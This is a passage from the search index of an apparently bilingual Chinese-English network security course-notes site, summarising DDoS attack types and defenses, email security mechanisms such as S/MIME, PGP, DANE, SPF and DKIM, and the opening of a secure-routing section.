<li>\u653b\u51fb\u8005\u5411\u5728\u7ebf\u652f\u4ed8\u7cfb\u7edf\u53d1\u9001\u5927\u91cf\u865a\u5047\u652f\u4ed8\u8bf7\u6c42\uff0c\u4ece\u800c\u8017\u5c3d\u652f\u4ed8\u7cfb\u7edf\u7684\u8d44\u6e90\uff0c\u4f7f\u5176\u65e0\u6cd5\u5904\u7406\u5408\u6cd5\u7684\u652f\u4ed8\u8bf7\u6c42\uff0c\u7ed9\u5546\u5bb6\u548c\u6d88\u8d39\u8005\u5e26\u6765\u7ecf\u6d4e\u635f\u5931</li> <li>\u653b\u51fb\u8005\u5e38\u5229\u7528\u5927\u91cf\u50f5\u5c38\u7f51\u7edc\u8282\u70b9\uff0c\u5411\u652f\u4ed8\u7cfb\u7edf\u53d1\u9001\u5927\u91cf\u865a\u5047\u652f\u4ed8\u8bf7\u6c42\uff0c\u8fd9\u4e9b\u8bf7\u6c42\u4e2d\u5305\u542b\u5927\u91cf\u65e0\u6548\u4fe1\u606f\uff0c\u5982\u865a\u5047\u4fe1\u7528\u5361\u4fe1\u606f\u3001\u865a\u5047\u652f\u4ed8\u91d1\u989d\u7b49\u3002\u4f46\u662f\uff0c\u7531\u4e8e\u652f\u4ed8\u7cfb\u7edf\u9700\u8981\u9a8c\u8bc1\u6bcf\u4e2a\u652f\u4ed8\u8bf7\u6c42\uff0c\u8fd9\u4e9b\u65e0\u6548\u4fe1\u606f\u4f1a\u8017\u5c3d\u652f\u4ed8\u7cfb\u7edf\u7684\u8d44\u6e90\uff0c\u4f7f\u5176\u65e0\u6cd5\u5904\u7406\u5408\u6cd5\u7684\u652f\u4ed8\u8bf7\u6c42</li> </ul> <ul> <li>\u7279\u70b9\uff1a<ul> <li>low rate at each merchant</li> <li>high rate at acquiring bank</li> </ul> </li> <li>\u89e3\u51b3\uff1a\u5546\u5bb6\u548c\u652f\u4ed8\u7cfb\u7edf\u53ef\u4ee5\u4f7f\u7528\u9632\u6b3a\u8bc8\u7cfb\u7edf\u6765\u68c0\u6d4b\u548c\u963b\u6b62\u865a\u5047\u652f\u4ed8\u8bf7\u6c42\u3001\u4f7f\u7528\u9632\u706b\u5899\u8fc7\u6ee4\u5668\u6765\u963b\u6b62\u6076\u610f\u6d41\u91cf\u3001\u52a0\u5f3a\u7528\u6237\u8eab\u4efd\u9a8c\u8bc1\u7b49</li> </ul>"}, {"location": "Course/netsec/ddos/#asymmetric-ddos-attack-others", "title": "Asymmetric DDoS Attack (Others)", "text": "<p>inside or outside the network</p> <p>1) Tail Attack</p> <p>bring down the entire server so far weakest link from inside </p> <p>Tail Attack</p> <ul> <li>Tail Attack \u5229\u7528\u65b0\u53d1\u73b0\u7684 N \u5c42\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\u7684\u7cfb\u7edf\u6f0f\u6d1e\uff08\u4e9a\u79d2\u7ea7\u6301\u7eed\u65f6\u95f4\u7684\u767e\u4e07\u74f6\u9888\u548c\u5f3a\u4f9d\u8d56\u6027\u7684\u8d44\u6e90\u4e89\u593a\uff09</li> <li>\u5206\u5e03\u5f0f\u8282\u70b9\u95f4\u5177\u6709\u5f3a\u70c8\u4f9d\u8d56\u6027\u6beb\u79d2\u7ea7\u74f6\u9888\u548c\u8d44\u6e90\u4e89\u593a\uff0c\u4ee5\u8fbe\u5230\u653b\u51fb\u76ee\u7684</li> <li>\u6700\u7ec8\u76ee\u6807\u662f\u9020\u6210\u76ee\u6807\u7f51\u7edc\u5e94\u7528\u7684\u957f\u5c3e\u5ef6\u65f6\uff08\u5982 95\u767e\u5206\u4f4d\u6570\u7684\u54cd\u5e94\u65f6\u95f4 &gt; 1 s\uff09\uff0c\u7834\u574f\u670d\u52a1\u63d0\u4f9b\u5546\u7684\u957f\u671f\u4e1a\u52a1\uff0c\u800c\u6240\u6709\u7684\u7cfb\u7edf\u8d44\u6e90\u90fd\u8fdc\u672a\u8fbe\u5230\u9971\u548c</li> </ul> <ul> <li>Tail attacks on n-tier web applications</li> <li>Identify weakest link across tiers</li> </ul> <p>2) SDN CrossPath Attack</p> <p>bring down the entire server so far weakest link from outside </p> Three-Layer Architecture <p></p> <ul> <li>deliver all control traffic; </li> <li>issue rules from controller to switches(\u4ea4\u6362\u673a);</li> <li>report stats from switches to controller;</li> <li> <p>guarantee security and reliability;</p> </li> <li> <p>\u53d1\u73b0\u9700\u8981\u5f88\u591a\u4ece controller \u5230 switch \u7684\u76f4\u63a5\u94fe\u8def\uff0c\u4ece\u800c\u5bfc\u81f4 limited scalability</p> </li> <li>\u53ef\u4ee5\u4f7f\u7528 shared links (relay control traffic via data paths) \u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898</li> </ul> <p></p> <p>SDN CrossPath Attack</p> <ul> <li>SDN (Software Defined Networking) \u662f\u4e00\u79cd\u57fa\u4e8e\u63a7\u5236\u5e73\u9762 (Control Plane) \u548c\u6570\u636e\u5e73\u9762 (Data Plane) \u5206\u79bb\u7684\u7f51\u7edc\u67b6\u6784\uff0c\u5b83\u5141\u8bb8\u7f51\u7edc\u7ba1\u7406\u5458\u901a\u8fc7\u96c6\u4e2d\u5f0f\u63a7\u5236\u5668\u6765\u7ba1\u7406\u548c\u63a7\u5236\u6574\u4e2a\u7f51\u7edc</li> <li>SDN CrossPath Attack \u662f\u9488\u5bf9 SDN \u4e2d\u7684\u8de8\u8def\u5f84\u6d41\u89c4\u5219\u8fdb\u884c\u653b\u51fb</li> <li>\u5728 SDN \u4e2d\uff0c\u8de8\u8def\u5f84\u6d41\u89c4\u5219\u7528\u4e8e\u5728\u4e0d\u540c\u4ea4\u6362\u673a\u95f4\u5b9e\u73b0\u6570\u636e\u6d41\u7684\u8def\u7531\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\uff0c\u901a\u8fc7\u5411 SDN \u63a7\u5236\u5668\u53d1\u9001\u5927\u91cf\u865a\u5047\u6d41\u89c4\u5219\uff08\u8fd9\u4e9b\u6d41\u89c4\u5219\u53ef\u80fd\u5bfc\u81f4\u6570\u636e\u6d41\u8de8\u8d8a\u4e0d\u540c\u4ea4\u6362\u673a\u8def\u5f84\uff0c\u5f62\u6210\u73af\u8def\uff0c\u6570\u636e\u6d41\u9047\u5230\u8fd9\u4e2a\u73af\u8def\u65f6\u4f1a\u9677\u5165\u65e0\u9650\u5faa\u73af\uff0c\u5360\u7528\u7f51\u7edc\u5e26\u5bbd\u548c\u4ea4\u6362\u673a\u8d44\u6e90\uff09\uff0c\u4f7f SDN \u63a7\u5236\u5668\u7684\u8d44\u6e90\u8017\u5c3d\uff0c\u65e0\u6cd5\u5904\u7406\u5408\u6cd5\u7684\u6d41\u89c4\u5219\u8bf7\u6c42</li> </ul> <p>\u7279\u70b9\uff1a</p> <ul> <li>Disrupt SDN control channel via shared links</li> <li>Do not directly attack SDN controller</li> <li>Instead, block control messages with attacking traffic \u2192</li> </ul>"}, {"location": "Course/netsec/ddos/#ddos-defenses", "title": "DDoS Defenses", "text": "<p>DDoS Defenses</p> <p>make server harder to be attacked</p>"}, {"location": "Course/netsec/ddos/#type-one", "title": "Type One", "text": "<p>Type One</p> <ul> <li>enrich server with more resources | \u901a\u8fc7\u589e\u52a0\u670d\u52a1\u5668\u7684\u8d44\u6e90\u6765\u589e\u5f3a\u670d\u52a1\u5668\u7684\u62b5\u6297\u80fd\u529b</li> <li>leverage the sources of others | \u5229\u7528\u4ed6\u4eba\u7684\u8d44\u6e90</li> </ul> <p>Google Project Shield</p> <ul> <li>Use Google bandwidth to shiel vulnerable websites | \u4f7f\u7528\u8c37\u6b4c\u5e26\u5bbd\u5c4f\u853d\u6613\u53d7\u653b\u51fb\u7684\u7f51\u7ad9</li> </ul> <p></p>"}, {"location": "Course/netsec/ddos/#type-two", "title": "Type Two", "text": "<p>Type Two</p> <p>detect and filter attack traffic with spoofed IP addresses | \u68c0\u6d4b\u548c\u8fc7\u6ee4\u5177\u6709\u4f2a\u9020 IP \u5730\u5740\u7684\u653b\u51fb\u6d41\u91cf</p> <p>\u8ba9\u653b\u51fb\u8005\u653b\u51fb\u66f4\u56f0\u96be</p>"}, {"location": "Course/netsec/ddos/#ingress-filtering", "title": "Ingress Filtering", "text": "<p>Ingress Filtering</p> <ul> <li>Ingrees Filtering (\u5165\u53e3\u8fc7\u6ee4) \u7528\u4e8e\u5728\u7f51\u7edc\u5165\u53e3\u5904\u5bf9\u6570\u636e\u5305\u8fdb\u884c\u8fc7\u6ee4\u548c\u68c0\u67e5\uff0c\u901a\u8fc7\u68c0\u67e5\u7f51\u7edc\u6d41\u91cf\u7684\u6e90 IP \u5730\u5740\uff0c\u5bf9\u975e\u6cd5\u7684\u6e90 IP \u5730\u5740\u8fdb\u884c\u8fc7\u6ee4\uff0c\u4ece\u800c\u963b\u6b62\u653b\u51fb\u8005\u901a\u8fc7 IP Spoofing \u653b\u51fb\u7f51\u7edc</li> <li>Ingress Filtering \u901a\u5e38\u90e8\u7f72\u5728\u7f51\u7edc\u8fb9\u754c\uff08\u5982\u8def\u7531\u5668\uff0c\u9632\u706b\u5899\u7b49\uff09\uff0c\u5bf9\u7f51\u7edc\u6d41\u91cf\u8fdb\u884c\u68c0\u67e5\u548c\u8fc7\u6ee4\uff0c\u5982\u679c\u6e90 IP \u5730\u5740\u975e\u6cd5\uff0c\u4f1a\u62d2\u7edd\u8be5\u6570\u636e\u5305\u7684\u8fdb\u5165\uff0c\u5e76\u5411\u7ba1\u7406\u5458\u53d1\u51fa\u8b66\u62a5</li> <li>Ingress Filtering \u53ef\u4ee5\u6709\u6548\u9632\u6b62 IP Spoofing \u653b\u51fb\uff0c\u4f46\u4e0d\u80fd\u5b8c\u5168\u89e3\u51b3\u7f51\u7edc\u5b89\u5168\u95ee\u9898\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5176\u4ed6\u65b9\u5f0f\u8fdb\u884c\u653b\u51fb</li> </ul> <p></p> <p>\u6570\u636e\u5305\u901a\u8fc7 ISP \u8fdb\u5165 internet, \u6240\u4ee5\u8981\u505a Ingress Filtering, \u9700\u8981 ISP \u7684\u53ea\u4f20\u8f93\u5408\u6cd5\u7684\u6570\u636e\u5305</p> <p>But \u2192 Implementation challenges:</p> <ol> <li>All ISPs need to do this \u2013 requires global cooperation<ol> <li>\u5373\u4fbf\u6709 10% \u7684\u7f51\u7edc\u4e0d\u5b9e\u65bd\uff0c\u5c31\u76f8\u5f53\u4e8e\u6ca1\u6709\u9632\u5fa1\u63aa\u65bd</li> <li>\u4f46 ISP \u6ca1\u6709\u5b9e\u65bd\u7684\u52a8\u529b \u2013 \u8fd9\u5bf9\u4ed6\u4eec\u6ca1\u6709\u5f71\u54cd</li> </ol> </li> <li>As of 2017 (from CAIDA):<ol> <li>33% of autonomous systems allow spoofing;</li> <li>23% of announced IP address space allow spoofing;</li> </ol> </li> </ol> <p>Can transit AS verify packet origin?</p> <p></p> <ul> <li>\u4e0d\u53ef\u4ee5\uff0c\u56e0\u4e3a routing protocols \u53ea\u5728\u4e4e destination IP address</li> <li>\u9664\u975e\u6211\u4eec\u4fee\u6539 routing protocols \u2192 \u8bf7\u7ee7\u7eed\u9605\u8bfb\u4e0b\u9762\u7684\u5185\u5bb9</li> </ul>"}, {"location": "Course/netsec/ddos/#traceback", "title": "Traceback", "text": "<p>Traceback</p> <ul> <li>\u7ed9\u5b9a\u4e00\u7ec4\u653b\u51fb\u6570\u636e\u5305\uff0c\u786e\u5b9a\u5230\u6e90\u7684\u8def\u5f84</li> <li>\u6700\u7b80\u5355\u7684\u65b9\u5f0f\u662f\u5728\u6570\u636e\u5305\u4e2d\u7ef4\u62a4\u8def\u5f84\u4fe1\u606f\uff0c\u4f46\u8fd9\u6837\u4f1a\u589e\u52a0\u6570\u636e\u5305\u7684\u5927\u5c0f\uff0c\u964d\u4f4e\u7f51\u7edc\u6027\u80fd</li> <li>\u53ef\u4ee5\u901a\u8fc7 Edge Sampling (\u57fa\u4e8e\u8def\u7531\u5668\u53ef\u4fe1\uff0c\u5305\u8db3\u591f\u591a\uff0c\u8def\u7531\u7a33\u5b9a\u7684\u5047\u8bbe)</li> </ul> <ul> <li>Goal: given set of attack packets, determine path to source</li> <li>How: change routers to record info in packets</li> <li>Assumptions:<ul> <li>trusted routers</li> <li>sufficient packets to track</li> <li>stable route from attacker to victim</li> </ul> </li> </ul> <p>1) \u53ef\u4ee5\u9009\u62e9 Write path into packets (router adds its own IP address to packet victim reads path from packet)</p> <ul> <li>Limitations: <ul> <li>requires space in packet</li> <li>path can be long</li> <li>no extra fields in current IP format (changes to packet format too much to expect)</li> <li>\u653b\u51fb\u8005\u53ef\u4ee5\u8f7b\u6613\u4fee\u6539\u4fdd\u5b58\u5728\u6570\u636e\u5305\u4e2d\u7684\u8def\u5f84\u4fe1\u606f</li> </ul> </li> </ul> <p>\u9488\u5bf9 packet \u8fc7\u5927\u7684 limitation, \u53ef\u4ee5 Sample and Merge \u7684\u601d\u60f3</p> <ul> <li>store one link in each packet;</li> <li>router probabilistically stores own address;</li> <li>fixed space regardless of path length;</li> </ul> <p>\u7531\u6b64\u5f15\u51fa Edge Sampling</p> <p>2) Edge Sampling: fileds into packet</p> <ul> <li>edge: <code>start</code> and <code>end</code> IP addresses</li> <li>distance: number of hops since edge stored</li> </ul> <p></p> <p>procedure \u5982\u4e0b\uff1a</p> <p></p> <ul> <li>\u6709\u4e00\u5b9a\u6982\u7387\u6539\u5199</li> <li>\u7531\u4e8e\u5305\u8db3\u591f\u591a\uff0c\u56e0\u6b64\u6839\u636e\u4e0d\u540c\u5305\u7684\u91c7\u6837\u5c31\u53ef\u4ee5\u8fd8\u539f\u51fa\u8def\u5f84\u3002</li> <li>\u4f46\u5982\u679c\u6709\u6076\u610f\u7684\u4e2d\u95f4\u8def\u7531\u5668\uff0c\u5c31\u4f1a\u6539\u5199\u8fd9\u4e9b\u4fe1\u606f\uff0c\u56e0\u6b64\u8fd9\u4e2a\u65b9\u6cd5\u5e76\u4e0d\u662f\u5341\u5206\u6709\u6548<ul> <li>\u53ef\u4ee5\u589e\u52a0\u4e00\u4e9b\u5bc6\u7801\u5b66\u624b\u6bb5\u505a\u6821\u9a8c (Path Validation)</li> </ul> </li> </ul>"}, {"location": "Course/netsec/ddos/#path-validation", "title": "Path Validation", "text": "<ul> <li>PoC: Proof of Consent<ul> <li>certify the provider\u2019s consent to carry traffic along the path | \u8bc1\u660e\u63d0\u4f9b\u5546\u540c\u610f\u6cbf\u8be5\u8def\u5f84\u4f20\u8f93\u6d41\u91cf</li> </ul> </li> <li>PoP: Proof of Provenance<ul> <li>allow upstream nodes to prove to downstream nodes that they carried the packet | \u5141\u8bb8\u4e0a\u6e38\u8282\u70b9\u5411\u4e0b\u6e38\u8282\u70b9\u8bc1\u660e\u4ed6\u4eec\u643a\u5e26\u4e86\u6570\u636e\u5305</li> </ul> </li> </ul> <p>\u6bcf\u4e00\u4e2a\u8282\u70b9\u90fd\u9700\u8981\u7ed9\u540e\u9762\u7684\u6bcf\u4e00\u8df3\u63d0\u4f9b\u4e00\u4e2a\u51ed\u8bc1 \u2014\u2014 \\(O(N^2)\\)</p>"}, {"location": "Course/netsec/ddos/#alibi-routing", "title": "Alibi Routing", "text": "<p>\u4e0d\u5e0c\u671b\u6d41\u91cf\u7ecf\u8fc7\u4e0d\u5b89\u5168\u7684 AS</p> <p>AliBi Routing</p> <ul> <li>AliBi Routing \u662f\u4e00\u79cd\u7f51\u7edc\u8def\u7531\u5b89\u5168\u6280\u672f\uff0c\u65e8\u5728\u4fdd\u62a4\u4e92\u8054\u7f51\u8def\u7531\u534f\u8bae\uff08\u5982 BGP\uff09\u4e2d\u7684\u8def\u7531\u4fe1\u606f\u4e0d\u88ab\u653b\u51fb\u8005\u7be1\u6539\u6216\u4f2a\u9020</li> <li>AliBi Routing \u901a\u8fc7\u5728\u7f51\u7edc\u4e2d\u6dfb\u52a0\u4e00\u7ec4\u8f85\u52a9\u8def\u5f84\u6765\u5b9e\u73b0\u8def\u7531\u9a8c\u8bc1\u548c\u9519\u8bef\u68c0\u6d4b</li> <li>\u8f85\u52a9\u8def\u5f84\u7531\u53ef\u4fe1\u7b2c\u4e09\u65b9\u63d0\u4f9b\uff0c\u4e0e\u4e3b\u8def\u5f84\u5e76\u884c\u4f20\u8f93\u8def\u7531\u4fe1\u606f</li> </ul> <p>\u5982\u4f55\u8bc1\u660e\u4e00\u4e2a packet \u6ca1\u6709\u7ecf\u8fc7\u67d0\u4e2a AS\uff1f -&gt; proof waypoint</p> <p>proof waypoint : packet \u5728\u7ed9\u5b9a\u65f6\u95f4\u9650\u5236\u5185\u4e0d\u53ef\u80fd\u540c\u65f6\u7ecf\u8fc7 proof waypoint \u548c\u9700\u8981\u907f\u5f00\u7684 AS</p> <p></p> <p>reference</p> <ul> <li>s: source</li> <li>d: destination</li> <li>F region: AS to avoid</li> <li>r: proof waypoint</li> </ul> <p>\u5982\u4e0a\u56fe\uff0c\u601d\u8def\u5c31\u662f\u9009\u53d6\u4e00\u4e2a\u7279\u522b\u7684\u70b9\uff0c\u5982\u679c\u8d70\u7684\u65f6\u95f4\u6bd4\u8fd9\u4e2a\u66f4\u957f\uff0c\u5c31\u8bf4\u660e\u8fd9\u4e2a\u70b9\u4f4d\u4e8e F region</p>"}, {"location": "Course/netsec/ddos/#type-three", "title": "Type Three", "text": "<p>Type Three</p> <p>cost more resources from attacker </p> <p>\u6d88\u8017\u653b\u51fb\u8005\u66f4\u591a\u8d44\u6e90</p>"}, {"location": "Course/netsec/ddos/#client-puzzles", "title": "Client Puzzles", "text": "<p>Client Puzzles</p> <p>\u8ba9 client (attackers) \u7b97 puzzle</p> <ul> <li>Idea:<ul> <li>force every client to do moderate amount of work for every connection they make</li> </ul> </li> <li>EXample:<ul> <li>server sends: C</li> <li>client: given challenge C find X s.t. </li> <li>\\(\\text{LSB}_n\\text{(SHA-1(C||X))} = \\text{0}^n\\) </li> </ul> </li> <li>Benfits:<ul> <li>\u5728\u68c0\u6d4b\u5230\u653b\u51fb\u65f6\u8c03\u7528</li> <li>\u53ef\u6839\u636e\u653b\u51fb\u6d41\u91cf\u8c03\u6574 n</li> </ul> </li> <li>Limitations<ul> <li>require changes to protocols, clients, and servers;</li> <li>during attack, hurts low-power legitimate clients (e.g., phones);</li> </ul> </li> </ul>"}, {"location": "Course/netsec/ddos/#captcha", "title": "CAPTCHA", "text": "<p>CAPTCHA</p> <ul> <li>CAPTCHA (Completely Automated Public Turing test to tell Computers and Humans Apart)</li> <li>challenge\u2013response test used in computing to determine whether or not the user is human</li> <li>\u5c31\u662f\u9a8c\u8bc1\u7801 (Type: Text, Image, Audio\u2026)</li> <li>Vulnerable to auto-identification</li> </ul> <ol> <li> <p>Timeout: evict a backlog entry if no ack is received until timeout, e.g., 3 mins\u00a0\u21a9</p> </li> </ol>"}, {"location": "Course/netsec/mailsec/", "title": "Email Security", "text": "<p> \u7ea6 1401 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p>"}, {"location": "Course/netsec/mailsec/#email-architecture", "title": "Email Architecture", "text": "MUA (Message User Agent) <ul> <li>hosted on a client email program or a local network email server;</li> <li>sender MUA formats a message and performs initial submission into MHS via an MSA (Mail Submission Agent);</li> <li>recipient MUA processes received email for storage and/or display to the recipient user</li> </ul> MHS (Message Handling Service) <ul> <li>composed of MTAs (Message Transfer Agents);</li> <li>accepts a message from sender and delivers it to one or more recipients;</li> <li>creates a virtual MUA-to-MUA environment;</li> </ul> <p>Email Protocol:</p> <ul> <li>Type 1: SMTP (Simple Mail Transfer Protocol)<ul> <li>move messages through the Internet from source to destination;</li> </ul> </li> <li>Type 2: IMAP (Internet Message Access Protocol) and POP (Post Office Protocol)<ul> <li>transfer messages between mail servers</li> </ul> </li> </ul> <p>POP3 downloads the email from a server to a single computer, then deletes the email from the server. IMAP stores the message on a server and synchronizes the message across multiple devices</p> Email Format <ul> <li>RFC 5322<ul> <li>view messages as having an envelope and contents;<ul> <li>envelope contains whatever information needed to accomplish transmission and delivery;</li> <li>contents compose the object to be delivered to the recipient;</li> </ul> </li> <li>RFC 5322 applies only to the contents;</li> <li>the content standard includes a set of header fields that may be used by the mail system to create the envelope;</li> </ul> </li> <li>MIME (Multipurpose Internet Mail Extensions)<ul> <li>extend RFC 5322 with enhancements;</li> <li>Define five new header fields to provide information about message content</li> <li>Standardize representations that support multimedia electronic mail</li> <li>Define transfer encodings that enable the conversion of any content format into a form that is protected from alteration by the mail system </li> </ul> </li> </ul> MIME Header <ul> <li>MIME-Version</li> <li>Content-Type</li> <li>Content-Transfer-Encoding</li> <li>Cotent-ID</li> <li>Content-Description</li> </ul>"}, {"location": "Course/netsec/mailsec/#email-security-threats", "title": "Email Security Threats", "text": "<ul> <li>Authentication-related Threats<ul> <li>could result in unauthorized access to an email system </li> </ul> </li> <li>Integrity-related Threats<ul> <li>could result in unauthorized modification of email content </li> </ul> </li> <li>Confidential-related Threats<ul> <li>could result in unauthorized disclosure of sensitive information </li> </ul> </li> <li>Availability-related Threats<ul> <li>could prevent end users from being able to send or receive email </li> </ul> </li> </ul>"}, {"location": "Course/netsec/mailsec/#smime", "title": "S/MIME", "text": "<p>Secure / Multipurpose Internet Mail Extension </p> <ul> <li>Authentication | \u8ba4\u8bc1</li> <li>Confidentiality | \u4fdd\u5bc6</li> <li>Compression | \u538b\u7f29 </li> <li>Email compatibility | \u517c\u5bb9</li> </ul> Info <p></p>"}, {"location": "Course/netsec/mailsec/#authentication", "title": "Authentication", "text": "<ol> <li>the sender creates a message</li> <li>use SHA-256 to generate a 256-bit message digest</li> <li>encrypt the message digest with RSA using the sender\u2019s private key; append the result as well as the signer\u2019s identity to the message</li> <li>the receiver uses RSA with the sender\u2019s public key to decrypt, recover, and verify the message digest</li> </ol>"}, {"location": "Course/netsec/mailsec/#confidentiality", "title": "Confidentiality", "text": "<ol> <li>the sender creates a message and a random 128-bit number as a content-encryption key for this message only</li> <li>encrypt the message using the content-encryption key</li> <li>encrypt the content-encryption key with RSA using the receiver\u2019s public key and append it to the message</li> <li>The receiver uses RSA with its private key to decrypt and recover the content-encryption key </li> <li>use the content-encryption key to decrypt the message</li> </ol> Authentication&amp;Confidentiality <p>All processes on the sender: including the process that the sender uses RSA and receiver\u2019s public key to encrypt one-time secret key and append it to the encrypted message;</p> <p></p>"}, {"location": "Course/netsec/mailsec/#content-type", "title": "Content Type", "text": "<ul> <li>Data\uff1a<ul> <li>inner MIME-encoded message content; may be encapsulated in the following types; </li> </ul> </li> <li>SignedData\uff1a<ul> <li>digital signature of a mesasge</li> </ul> </li> <li>EnvelopedData<ul> <li>encrypted data of any type, and encrypted content-encryption keys for one or more recipients;</li> </ul> </li> <li>CompressedData<ul> <li>data compression of a message</li> </ul> </li> </ul>"}, {"location": "Course/netsec/mailsec/#pgp", "title": "PGP", "text": "<p>Pretty Good Privacy, same functionality as S/MIME\uff0cfree and popular for personal use.</p> <p>\u4e0e S/MIME \u4e0d\u540c\u7684\u662f\uff1a</p> <ul> <li>Key Certification <ul> <li>S/MIME uses X.509 certificates issued by CA or delegated authorities; | S/MIME \u4f7f\u7528\u7531 CA \u6216\u6388\u6743\u673a\u6784\u9881\u53d1\u7684 X.509 \u8bc1\u4e66</li> <li>OpenPGP allows users to generate their own OpenPGP public and private keys, and then solicit signatures for their public keys from known individuals or organizations</li> </ul> </li> <li>Key Distribution <ul> <li>OpenPGP does not include the sender\u2019s public key with each message;</li> <li>recipient needs to separately obtain that from TLS-protected websites or OpenPGP public key servers;</li> <li>no vetting of OpenPGP keys, users decide whether to trust on their own</li> </ul> </li> </ul> <p>NIST 800-177 recommends the use of S/MIME rather than PGP because of the greater confidence in the CA system of verifying public keys</p>"}, {"location": "Course/netsec/mailsec/#dane", "title": "DANE", "text": "<p>If any of the hundreds of CAs operating on the Internet is compromised, the effects can be widespread.</p> <p>The attacker can obtain the CA\u2019s private key, get issued certificates under a false name, or introduce new bogus root certificates into a root certificate store. </p> <ul> <li>DNS-based Authentication of Named Entities</li> <li>allow X.509 certificates to be bound to DNS names using DNSSEC</li> </ul> <ul> <li>The purpose of DANE is to replace reliance on the security of the CA system with reliance on the security provided by DNSSEC.</li> <li>Given that the DNS administrator for a domain name is authorized to give identifying information about the zone, it makes sense to allow that administrator to also make an authoritative binding between the domain name and a certificate that might be used by a host at that domain name. </li> </ul>"}, {"location": "Course/netsec/mailsec/#tlsa-record", "title": "TLSA Record", "text": "<ul> <li>TLS Authentication Record</li> <li>A new DNS record type defined by DANE</li> <li>Used for a secure method of authenticating SSL/TLS certificates</li> <li>Specify constraints on which CA can vouch for a certificate, or which specific PKIX [Public Key Infrastructure (X.509)] end-entity certificate is valid.  | \u6307\u5b9a CA \u53ef\u4ee5\u4e3a\u8bc1\u4e66\u63d0\u4f9b\u62c5\u4fdd\u7684\u7ea6\u675f\u6761\u4ef6\uff0c\u6216\u6307\u5b9a\u7279\u5b9a\u7684 PKIX [Public Key Infrastructure (X.509)] end-entity \u8bc1\u4e66\u6709\u6548\u7684\u7ea6\u675f\u6761\u4ef6\u3002</li> <li>Specify that a service certificate or a CA can be directly authenticated in the DNS itself. | \u6307\u5b9a\u53ef\u4ee5\u76f4\u63a5\u5728 DNS \u4e2d\u8ba4\u8bc1\u7684 service certificate \u6216\u8005 CA\u3002</li> </ul> Format <ul> <li>format of TLSA as it is transmitted to a requesting entity </li> <li>Certificate Usage:<ul> <li>define four different usage models, to accommodate users who require different forms of authentication </li> <li>PKIX-TA (CA constraint): Specifies which CA should be trusted to authenticate the certificate for the service</li> <li>PKIX-EE (service certificate constraint): Defines which specific end entity service certificate should be trusted for the service </li> <li>DANE-TA (trust anchor assertion): Specifies a domain-operated CA to be used as a trust anchor </li> <li>DANE-EE (domain-issued certificate): Specifies a domain-operated CA to be used as a trust anchor</li> </ul> </li> <li>Selector<ul> <li>indicate whether the full certificate will be matched or just the value of the public key</li> </ul> </li> <li>Matching Type<ul> <li>indicate how the match of the certificate is made: exact match, SHA-256 hash match, or SHA-512 hash match</li> </ul> </li> <li>Certificate Association Data<ul> <li>represent the raw certificate data in hex format</li> </ul> </li> </ul>"}, {"location": "Course/netsec/mailsec/#dane-for-smtp", "title": "DANE For SMTP", "text": "<p>DANE (DNS-based Authentication of Named Entities)</p> <ul> <li>Targeted vulnerabilities:<ul> <li>attackers can strip away the TLS capability advertisement and downgrade the connection to not use TLS; </li> <li>TLS connections are often unauthenticated (e.g., the use of self-signed certificates as well as mismatched certificates is common)</li> </ul> </li> <li>A domain can use the presence of TLSA as an indicator that encryption must be performed, thus preventing malicious downgrade</li> <li>A domain can authenticate the certificate used in the TLS connection setup using a DNSSEC-signed TLSA</li> </ul>"}, {"location": "Course/netsec/mailsec/#dane-for-smime", "title": "DANE For S/MIME", "text": "<ul> <li>Introduce a SMIMEA DNS record to associate certificates with DNS domain names</li> <li>Help MUAs to deal with domain names as specified in email addresses in the message body (rather than domain names specified in the outer SMTP envelope \u2013 purpose of TLSA) </li> </ul>"}, {"location": "Course/netsec/mailsec/#spf", "title": "SPF", "text": "<p>SPF (Sender Policy Framework)</p> <ul> <li>ADMDs (Administrative Management Domains) publish SPF records in DNS specifying which hosts/IP-addresses are permitted to use their names;</li> <li>receivers use the published SPF records to test the authorization of sending Mail Transfer Agents (MTAs) using a given \u201cHELO\u201d or \u201cMAIL FROM\u201d identity during a mail transaction;</li> </ul> <p>An SMTP client, after receiving the greeting message, will normally send an HELO or EHLO command: where the domain given is the fully qualified name (host+domain) of the sending client.</p>"}, {"location": "Course/netsec/mailsec/#dkim", "title": "DKIM", "text": "<ul> <li>sign email message by a private key of the administrative domain from which the email originates;</li> <li>at the receiving end, the MDA can access the corresponding public key via a DNS and verify the signature, thus authenticating that the message comes from the claimed administrative domain </li> </ul> <p>MDA (Mail Delivery Agent) </p> <ul> <li>SPF lets receiving servers know the sending sources permitted to send email messages on your domain\u2019s behalf.</li> <li>DKIM tells receiving servers that incoming messages purporting to come from your domain/organization must have a digital signature that matches the public key in your DKIM record.</li> </ul> <ul> <li>Difference from S/MIME and PGP:<ul> <li>S/MIME and PGP use the sender\u2019s private key to sign the content of the message;</li> <li>DKIM uses the private key of the domain where the sender locates;</li> </ul> </li> </ul>"}, {"location": "Course/netsec/mailsec/#what-if-email-is-exploited", "title": "What if Email is exploited?", "text": "<ul> <li>SPam</li> <li>Phishing</li> <li>Malware</li> </ul>"}, {"location": "Course/netsec/routesec/", "title": "Secure Routing", "text": "<p> \u7ea6 1433 \u4e2a\u5b57  87 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p> <p>Deliver Scheme:</p> <ul> <li><code>unicast</code>\u00a0delivers a message to a single specific node</li> <li><code>broadcast</code>\u00a0delivers a message to all nodes in the network</li> <li><code>multicast</code>\u00a0delivers a message to a group of nodes</li> <li><code>anycast</code>\u00a0delivers a message to any one out of a group of nodes, typically the one nearest to the source</li> <li><code>geocast</code>\u00a0delivers a message to a group of nodes based on\u00a0geographic location</li> </ul> <p>Unicast is the dominant form of message delivery on the Internet.\u00a0</p> <p>\u73b0\u5728\uff0c\u6211\u4eec\u7684\u76ee\u6807\u662f\u5c06\u4fe1\u606f\u4ece\u4e00\u4e2a\u8282\u70b9\u4f20\u9012\u5230\u53e6\u4e00\u4e2a\u8282\u70b9\uff0c\u90a3\u4e48\u5982\u4f55\u5728\u5b83\u4eec\u4e4b\u95f4\u627e\u5230\u4e00\u6761\u53ef\u884c\u7684\u8def\u5f84\u5462\uff1f</p> <p>This is the focus of a routing scheme.</p> 